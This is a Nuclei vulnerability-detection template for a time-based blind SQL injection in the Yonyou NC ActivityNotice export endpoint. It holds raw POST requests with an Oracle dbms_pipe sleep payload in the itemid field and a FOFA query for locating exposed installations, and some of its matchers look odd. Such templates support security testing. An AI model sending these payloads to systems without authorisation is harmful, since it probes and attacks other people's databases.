id: yonyou-nc-activitynotice-sqli
info:
  name: "用友 NC ActivityNotice SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友NC
  metadata:
    finger: ufida-nc
    fofa: app="用友-UFIDA-NC"

flow: |
  http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ufida"

  - raw:
      - |
        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        
        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 5)--
      - |
        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        
        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 8)--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: header
        words:
          - ":master"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
